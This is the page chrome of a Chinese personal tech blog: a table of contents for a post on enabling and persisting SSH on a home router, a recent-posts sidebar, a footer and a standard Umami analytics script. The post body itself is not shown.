href="#%E5%BC%80%E5%A7%8B"><span class="toc-number">2.</span> <span class="toc-text"> 开始!</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">2.1.</span> <span class="toc-text"> 准备的工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A3%B9-%E6%8A%93%E5%8C%85%E4%BF%AE%E6%94%B9%E6%9D%83%E9%99%90"><span class="toc-number">2.2.</span> <span class="toc-text"> 壹 • 抓包修改权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B4%B0-%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E8%BF%9E%E6%8E%A5%E8%B7%AF%E7%94%B1%E5%99%A8"><span class="toc-number">2.3.</span> <span class="toc-text"> 贰 • 利用漏洞连接路由器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%81-%E5%9C%A8%E7%BB%88%E7%AB%AF%E6%89%93%E5%BC%80ssh"><span class="toc-number">2.4.</span> <span class="toc-text"> 叁 • 在终端打开SSH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%82%86-%E5%9B%BA%E5%8C%96ssh"><span class="toc-number">2.5.</span> <span class="toc-text"> 肆 固化SSH</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/6c827b32/" title="DN42 从入坑到放弃 - Part4 动态路由"><img src="https://pic.lie-kong.top/pic/683be6ccf0997/79f883440af0ce3999f455b2de0a9c34.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DN42 从入坑到放弃 - Part4 动态路由"/></a><div class="content"><a class="title" href="/posts/6c827b32/" title="DN42 从入坑到放弃 - Part4 动态路由">DN42 从入坑到放弃 - Part4 动态路由</a><time datetime="2025-07-30T10:49:59.000Z" title="Created 2025-07-30 18:49:59">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/9e71ef22/" title="[折腾笔记]RAX3000QY刷入Uboot和ImmortalWrt"><img src="https://pic.lie-kong.top/pic/6854cb68d2ba3/0c4805be29d9da48fcfebae1c067609b.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[折腾笔记]RAX3000QY刷入Uboot和ImmortalWrt"/></a><div class="content"><a class="title" href="/posts/9e71ef22/" title="[折腾笔记]RAX3000QY刷入Uboot和ImmortalWrt">[折腾笔记]RAX3000QY刷入Uboot和ImmortalWrt</a><time datetime="2025-06-10T16:04:44.000Z" title="Created 2025-06-11 00:04:44">2025-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/9aad8a2d/" title="[折腾笔记]RAX3000QY开启SSH"><img src="https://pic.lie-kong.top/pic/6854da89cfd22/4ed1115e44eb68d7694b46a6a95dc30c.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[折腾笔记]RAX3000QY开启SSH"/></a><div class="content"><a class="title" href="/posts/9aad8a2d/" title="[折腾笔记]RAX3000QY开启SSH">[折腾笔记]RAX3000QY开启SSH</a><time datetime="2025-06-10T04:03:07.000Z" title="Created 2025-06-10 12:03:07">2025-06-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/7ff16bf1/" title="Docker/Gcr/Ghcr公益镜像源上线"><img src="https://pic.lie-kong.top/pic/68458653b96f5/5eb659cbba720fa895f40d509a21a979.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Docker/Gcr/Ghcr公益镜像源上线"/></a><div class="content"><a class="title" href="/posts/7ff16bf1/" title="Docker/Gcr/Ghcr公益镜像源上线">Docker/Gcr/Ghcr公益镜像源上线</a><time datetime="2025-06-08T12:41:59.000Z" title="Created 2025-06-08 20:41:59">2025-06-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/65d62b7b/" title="为BuyVM的Debian机添加IPv6">为BuyVM的Debian机添加IPv6</a><time datetime="2025-06-02T07:15:47.000Z" title="Created 2025-06-02 15:15:47">2025-06-02</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Lie_Kong</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.3</a></span></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://icp.gov.moe/?keyword=20251101">萌 ICP 备 20251101 号</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script>(() => {
+  const option = null
+  const config = {"site_uv":true,"site_pv":true,"page_pv":true,"token":"nHih7CE3C4G3bxkjcuEr4yET+dpgPouL6Gm42/k4855bSzSodBK+E1n3YqVngEx8dS09YV9uqmHIhE5Eq9h6jKaMwaE/ysIIKDIjABJLisBhdDzxeiMqjrpx4FrZxpqc2SSAI3q6seBEUECIIM+IWjQh/Z4sz4qh6CldT468xYhX4e3zkPJ87pJBuxPaRENHNIbRQoCZ8ETqG7IF0bQTTNiARvkPJ0qy/M89DqHSo1eBgM2QTAnt53Z9r4kGH4bTwdFl6zGmzwOeXYxjkEQa6PiOKg+oZXOz5PH8C6RHZ5gfCDBfuxMmm0UBiGso1v5jW71ozvkD1tY+6Ikn7MITLBCP6X6324/A06BXX6pDLeasxdA9p0uvco4+8uJ/QjVWKcEo"}
+
+  const runTrack = () => {
+    umami.track(props => ({ ...props, url: window.location.pathname, title: GLOBAL_CONFIG_SITE.title }))
+  }
+
+  const loadUmamiJS = () => {
+    btf.getScript('https://umami.lie-kong.top/script.js', {
+      'data-website-id': 'd2fc184e-48ac-435c-a56e-74da268797a3',
+      'data-auto-track': 'false',
+      ...option
+    }).then(runTrack)
+  }
+
+  const getData = async (isPost) => {
+    const now = Date.now()
+    const keyUrl = isPost ? `&url=${window.location.pathname}` : ''
+    const headerList = { 'Accept': 'application/json' }
+    if (true) headerList['Authorization'] = `Bearer ${config.token}`
+    else headerList['x-umami-api-key'] = config.token
+    const res = await fetch(`https://umami.lie-kong.top/api/websites/d2fc184e-48ac-435c-a56e-74da268797a3/stats?startAt=0000000000&endAt=${now}${keyUrl}`, {
+      method: "GET",
+      headers: headerList
+    })
+    return await res.json()
+  }
+
+  const insertData = async () => {
+    try {
+      if (GLOBAL_CONFIG_SITE.pageType === 'post' && config.page_pv) {
+        const pagePV = document.getElementById('umamiPV')
+        if (pagePV) {
+          const data = await getData(true)
+          pagePV.textContent = data.pageviews.value
+        }
+      } else {
+        const data = (config.site_uv || config.site_pv) && await getData()
+        if (config.site_uv) {
+          const siteUV = document.getElementById('umami-site-uv')
+          if (siteUV) siteUV.textContent = data.visitors.value
+        }
+        if (config.site_pv) {
+          const sitePV = document.getElementById('umami-site-pv')
+          if (sitePV) sitePV.textContent = data.pageviews.value
+        }
+      }
+    } catch (e) {
+      console.error('Failed to load Umami Analytics:', e)
+    }
+  }
+
+  btf.addGlobalFn('pjaxComplete', runTrack, 'umami_analytics_run_track')
+  btf.addGlobalFn('pjaxComplete', insertData, 'umami_analytics_insert')
+
+  loadUmamiJS()
+  insertData()
+})()</script></div></body></html>
